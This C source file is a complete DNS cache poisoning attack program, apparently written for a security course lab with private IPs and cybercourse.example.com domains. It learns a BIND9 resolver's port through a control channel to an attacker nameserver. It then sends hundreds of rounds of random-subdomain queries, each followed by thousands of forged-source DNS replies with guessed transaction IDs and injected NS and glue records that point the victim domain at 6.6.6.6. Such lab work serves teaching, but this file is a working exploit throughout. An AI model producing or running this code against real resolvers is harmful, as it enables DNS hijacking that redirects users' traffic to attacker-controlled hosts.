#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip.h> // ip header struct
#include <netinet/udp.h> // udp header struct
#include <netinet/if_ether.h> // link header struct
#include <pcap.h>
#include <ldns/ldns.h>

const char *AUTH_NS_IP = "192.168.1.204";
const char *ATTACKER_AUTH_IP = "192.168.1.201";
const char *BIND9_IP = "192.168.1.203";
const char *POISON_IP = "6.6.6.6";
const char* BIND9_MAC = "\x02\x42\xac\x11\x00\x03";
const char* ATTACKER_CLIENT_MAC = "\x02\x42\xac\x11\x00\x02";
const char* ATTACKER_NS_DOMAIN  = "www.attacker.cybercourse.example.com";
const char* VICTIM_DOMAIN = "www.example1.cybercourse.example.com";
const char*  BASE_DOMAIN = "example1.cybercourse.example.com";


const uint32_t TXID_OPTION_NUM = 65536;
const int PACKETS_NUM_PER_ROUND = 3000;
const int ATTACK_ROUND_NUM = 436;
const int MAX_SUBDOMAIN_LENGTH = 256;

#define CONTROL_PORT 5000   // TCP control channel port
#define DNS_PORT 53 // DNS port number
#define MAX_DNS_PACKET_SIZE  1500

// Open TCP control channel from attacker-client to attacker-ns
int open_tcp_connection(void)
{
    // create a TCP socket for IPv4
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        exit(1);
    }

    // use socket options and add flags as required
    int opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt,
    sizeof(opt)) < 0) {
        close(sockfd);
        exit(1);
    }
    opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt,
    sizeof(opt)) < 0) {
        close(sockfd);
        exit(1);
    }

    // create the ip and port address struct the clients connects to
    struct sockaddr_in serv_addr ={0}; // struct to hold IP, port and address family (IPv4)
    serv_addr.sin_family = AF_INET; // IPv4 IP family
    serv_addr.sin_port = htons(CONTROL_PORT);

    // converting the IP string into binary format and store it in the struct
    if (inet_pton(AF_INET, ATTACKER_AUTH_IP, &serv_addr.sin_addr) <= 0) {
        close(sockfd);
        exit(1);
    }

    // connecting to attacker's authority NS
    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        close(sockfd);
        exit(1);
    }


    return sockfd;
}

void send_udp_query_to_bind(const char *name) {
    //create a UDP socket
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        exit(1);
    }

    // create address struct of bind9
    struct sockaddr_in addr = {0}; // struct to hold IP, port and address family (IPv4)
    addr.sin_family = AF_INET; // IPv4 IP family
    addr.sin_port = htons(DNS_PORT); // port number 53 for DNS

    // converting the IP string into binary format and store it in the struct
    if (inet_pton(AF_INET, BIND9_IP, &addr.sin_addr) <= 0) {
        close(sock);
        exit(1);
    }

    // create a minimal DNS query
    ldns_pkt *q = ldns_pkt_query_new(
        // convert the domain string into DNS format
        ldns_dname_new_frm_str(name), // name
        LDNS_RR_TYPE_A, // type - A
        LDNS_RR_CLASS_IN, //c lass -IN
        LDNS_RD // flag - recursion flag
    );

    // Converts the DNS packet to raw bytes
    uint8_t *wire = NULL; // will point to the raw DNS bytes
    size_t wire_len = 0; // will contain the packet suze
    ldns_pkt2wire(&wire, q, &wire_len); // serializes the LDNS packet into network format

    // Sends the DNS packet one time to BIND9 without waiting for a response
    sendto(sock, wire, wire_len, 0, (struct sockaddr*)&addr, sizeof(addr));

    free(wire);
    ldns_pkt_free(q);
    close(sock);
}

uint16_t recv_resolver_port(int sockfd)
{
    uint16_t resolver_port = 0;
    uint8_t *p = (uint8_t *)&resolver_port;
    size_t total = 0;

    while (total < sizeof(resolver_port)) {
        ssize_t n = recv(sockfd,
                         p + total,
                         sizeof(resolver_port) - total,
                         0);
        if (n < 0) {
            close(sockfd);
            exit(1);
        }
        if (n == 0) {
            close(sockfd);
            exit(1);
        }
        total += (size_t)n;
    }

    return resolver_port;
}

uint16_t ip_checksum(struct ip *ip_hdr, size_t header_len) {
    //splits the header into 2-bytes words (big endian)
    uint16_t *words = (uint16_t *) ip_hdr;
    size_t num_of_words = header_len / 2; // ip header len is always even

    uint32_t sum = 0; // 32 bits instead of 16 bits length in order to handle carry
    //sum all words in one's complement
    for (size_t i = 0; i < num_of_words; i++) {
        // convert words from network byte order to host byte order for correct arithmetic
        sum += ntohs(words[i]); // ntohs() on 16 bit words, then expand to 32 bit to add to sum
    }

    //compute modulo 2^16 - 1 (fold carries)
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    //calculate (2^16 -1) - s in one's complement
    return (uint16_t)~sum;
}

uint16_t udp_checksum(struct ip *ip_hdr, struct udphdr *udp_hdr,
                      uint8_t *data, int data_len) {
    // the UDP checksum contains a pseudo header (from IP),
    // the UDP header and the UDP payload (DNS header and data)

    // convert IP addresses from network byte order to host byte order for correct arithmetic
    uint32_t src = ntohl(ip_hdr->ip_src.s_addr);
    uint32_t dst = ntohl(ip_hdr->ip_dst.s_addr);

    uint32_t sum = 0;

    // adding the pseudo header (source ip, dest ip, protocol and UDP package length)
    sum += (src >> 16) & 0xFFFF; // 2 high bytes of source IPv4 address
    sum += src & 0xFFFF; // 2 low bites of source IPv4 address
    sum += (dst >> 16) & 0xFFFF; // 2 high bytes of destination IPv4 address
    sum += dst & 0xFFFF; // 2 low bytes of destination IPv4 address
    sum += (uint16_t)IPPROTO_UDP;  // 1 byte of protocol (padded to 16 bit prior = hence the htons)
    sum += ntohs(udp_hdr->len); // 2 bytes UDP length (header + data)

    // adding UDP header
    uint16_t *words = (uint16_t *)udp_hdr;
    int num_of_words_udp_hdr = sizeof(struct udphdr) / 2;
    for (int i = 0; i < num_of_words_udp_hdr; i++) {
        // convert words from network byte order to host byte order for correct arithmetic
        sum += ntohs(words[i]);
    }

    // adding UDP data (DNS Header and DNS data)
    words = (uint16_t *)data;
    for (int i = 0; i < data_len / 2; i++) {
        sum += ntohs(words[i]);
    }

    // if the length in odd add the last one
    if (data_len & 1) {
        sum += ((uint16_t)data[data_len - 1]) << 8;
    }

    //compute modulo 2^16 - 1 (fold carries)
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    //calculate (2^16 -1) - s in one's complement
    return (uint16_t)(~sum);
}

void send_spoofed_packets(uint16_t resolver_port,
                          const char *subdomain) {
    char errbuf[PCAP_ERRBUF_SIZE];
    const int TIMEOUT_MS = 1000;
    const char* PCAP_INTERFACE_NAME = "eth0";
    const uint32_t TTL = 600;

    // creating the Layer 2 pipe for sending the package
    pcap_t * handle = pcap_open_live(PCAP_INTERFACE_NAME, BUFSIZ, 1, TIMEOUT_MS, errbuf);
    if (handle == NULL) {
        return;
    }
    // building the spoofed DNS answer

    // Header
    ldns_pkt *response = ldns_pkt_new(); // create DNS package for answer
    ldns_pkt_set_qr(response, 1); // 1 for answer
    ldns_pkt_set_aa(response, 1); // 1 for - the server is authoritative for the requested record
    ldns_pkt_set_rd(response, 0); // matters only for stub and resolver
    ldns_pkt_set_ra(response, 0); // 1 for availability of recursive response
    ldns_pkt_set_opcode(response, LDNS_PACKET_QUERY); // OPCODE

    // Question Section
    ldns_rr *question = ldns_rr_new(); // create an empty resource record (RR)
    ldns_rr_set_owner(question, ldns_dname_new_frm_str(subdomain)); // QNAME
    ldns_rr_set_type(question, LDNS_RR_TYPE_A); // QTYPE
    ldns_rr_set_class(question, LDNS_RR_CLASS_IN); // QCLASS
    ldns_pkt_push_rr(response, LDNS_SECTION_QUESTION, question); // COPY THE QUESTION TO THE ANSWER

    // Answer Section (for the queried wwN subdomain)
    ldns_rr *answer_rr = ldns_rr_new();
    ldns_rr_set_owner(answer_rr, ldns_dname_new_frm_str(subdomain));  // same as QNAME
    ldns_rr_set_type(answer_rr, LDNS_RR_TYPE_A); // record Type - A
    ldns_rr_set_class(answer_rr, LDNS_RR_CLASS_IN); // class usually (IN)
    ldns_rr_set_ttl(answer_rr, TTL);  // Time To Leave
    // convert the domain string into DNS format
    ldns_rdf *ans_rdf = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, POISON_IP);
    ldns_rr_push_rdf(answer_rr, ans_rdf); // RR data "6.6.6.6"
    ldns_pkt_push_rr(response, LDNS_SECTION_ANSWER, answer_rr); // add the Answer Section to the DNS response

    // Authority Section
    ldns_rr *ns_rr = ldns_rr_new(); // create an empty resource record (RR)
    ldns_rr_set_owner(ns_rr, ldns_dname_new_frm_str(subdomain)); // DNS string "ww%d.example1.cybercourse.example.com"
    ldns_rr_set_type(ns_rr, LDNS_RR_TYPE_NS); // record type - NS
    ldns_rr_set_class(ns_rr, LDNS_RR_CLASS_IN); // class usually (IN)
    ldns_rr_set_ttl(ns_rr, TTL); // Time To Leave
    ldns_rr_push_rdf(ns_rr, ldns_dname_new_frm_str(VICTIM_DOMAIN)); // RR data "www.example1.cybercourse.example.com"
    ldns_pkt_push_rr(response, LDNS_SECTION_AUTHORITY, ns_rr); // add the Authority Section to the DNS response

    // Additional Section
    ldns_rr *additional_rr = ldns_rr_new(); // create an empty resource record (RR)
    ldns_rr_set_owner(additional_rr, ldns_dname_new_frm_str(VICTIM_DOMAIN)); // name "www.example1.cybercourse.example.com"
    ldns_rr_set_type(additional_rr, LDNS_RR_TYPE_A); // record Type - A
    ldns_rr_set_class(additional_rr, LDNS_RR_CLASS_IN); // Class usually (IN)
    ldns_rr_set_ttl(additional_rr, TTL); // Time To Leave

    struct in_addr poison_addr = {0}; // create address struct
    inet_pton(AF_INET, POISON_IP, &poison_addr); // convert "6.6.6.6" to binary
    // rdf object holding the actual data - poisoned IP
    ldns_rdf *addr_rdf = ldns_rdf_new_frm_data(LDNS_RDF_TYPE_A, 4, &poison_addr);
    ldns_rr_push_rdf(additional_rr, addr_rdf); // add rdf object to the Additional Section RR
    ldns_pkt_push_rr(response, LDNS_SECTION_ADDITIONAL, additional_rr); // add the Additional Section to the DNS response

    // send the spoofed answers with different TXID's
    for (int i = 0; i < PACKETS_NUM_PER_ROUND; i++) {
        // create the packet, initialize to zero
        uint8_t packet[MAX_DNS_PACKET_SIZE] = {0};

        // set TXID
        uint16_t random_txid = (uint16_t)arc4random_uniform(TXID_OPTION_NUM);
        ldns_pkt_set_id(response, (uint16_t)random_txid);

        uint8_t *dns_data;
        size_t dns_size;

        // converting ldns packet to bytes into the dns_data pointer
        if (ldns_pkt2wire(&dns_data, response, &dns_size) != LDNS_STATUS_OK) {
            continue;
        }

        size_t mac_size = 6;
        size_t link_header_size = 14;
        size_t ip_header_size = 20;
        size_t udp_header_size = 8;

        // build Link layer header
        struct ether_header *eth = (struct ether_header *)packet;
        memcpy(eth->ether_dhost, BIND9_MAC, mac_size);//destination mac
        memcpy(eth->ether_shost, ATTACKER_CLIENT_MAC, mac_size);//source mac
        eth->ether_type = htons(ETHERTYPE_IP);//ether type of IPV4(0x0800) 2 bytes

        //IP header
        struct ip *ip_hdr = (struct ip *)(packet + link_header_size);
        ip_hdr->ip_v = 4; //IPV4 version. one byte therefore big-endian representation equals to little-endian
        ip_hdr->ip_hl = 5; //length of ip header(in units of 32 bit words) stored in the Byte with ip_v
        ip_hdr->ip_tos = 0; //type of service- dscp/ecn. one Byte - there is no endianness
        //total length in bytes(ip header + UDP header + DNS header) in big endian
        size_t udp_header_len = 8;
        size_t ip_header_len = 20;
        ip_hdr->ip_len = htons((uint16_t)(ip_header_len + udp_header_len + dns_size)); // store in big-endian
        // identification for fragmentation in big endian - not important value for the attack
        ip_hdr->ip_id = htons((uint16_t)random()); //2 bytes -here not important
        ip_hdr->ip_off = 0; // 2 bytes, no fragmentation - flags are off (no frag-offset required)
        // there are no router's hops, the containers are in the same LAN. put 64 for the packet to be valid
        ip_hdr->ip_ttl = 64;
        ip_hdr->ip_p = IPPROTO_UDP; //1 byte - protocol of the next layer (transport)
        //2 bytes - ip header checksum, must be zero before calculating the actual value, will be computed later
        ip_hdr->ip_sum = 0;
        inet_pton(AF_INET, AUTH_NS_IP, &ip_hdr->ip_src);// forged source IP
        inet_pton(AF_INET, BIND9_IP, &ip_hdr->ip_dst);//resolver IP

        //UDP header
        struct udphdr *udp_hdr = (struct udphdr *)(packet + link_header_size + ip_header_size);
        udp_hdr->source = htons(DNS_PORT); //source port in big endian
        udp_hdr->dest = htons(resolver_port); // destination port in big endian
        udp_hdr->len = htons((uint16_t)(udp_header_size + dns_size)); // total header and data length
        udp_hdr->check = 0; // placeholder, will be computed later

        //copy dns data to the packet
        memcpy(packet + link_header_size + ip_header_size + udp_header_size, dns_data, dns_size);

        // update UDP chacksum
        udp_hdr->check = htons(udp_checksum(ip_hdr, udp_hdr,
                                            packet + link_header_size + ip_header_size + udp_header_size,
                                            (int)dns_size));

        // update IP checksum
        ip_hdr->ip_sum = htons(ip_checksum(ip_hdr, ip_header_len));

        int packet_size = (int)(link_header_size + ip_header_size + udp_header_size + dns_size);

        // sending the package on the Layer 2 pipe
        pcap_sendpacket(handle, packet, packet_size);
        free(dns_data);
    }

    ldns_pkt_free(response);
    pcap_close(handle);
}

int main(void)
{
    // open TCP control channel to attacker-ns
    int control_sock = open_tcp_connection();

    // trigger the bind9 to send a DNS query to the attacker NS
    send_udp_query_to_bind(ATTACKER_NS_DOMAIN);

    // Receive bind9's port from attacker-ns over TCP
    uint16_t resolver_port = recv_resolver_port(control_sock);

    // close TCP connection
    close(control_sock);

    // x * 3000 = 65,536 * 20
    // x = 436.9 ~ 437
    for (int i = 0; i < ATTACK_ROUND_NUM; i++) {
        // creating the random subdomains
        char subdomain[MAX_SUBDOMAIN_LENGTH];

        snprintf(subdomain, sizeof(subdomain), "ww%d.%s", i, BASE_DOMAIN);
        // sending the malicious query
        send_udp_query_to_bind(subdomain);
        // sending the spoofed answer
        send_spoofed_packets(resolver_port, subdomain);
    }
    return 0;
}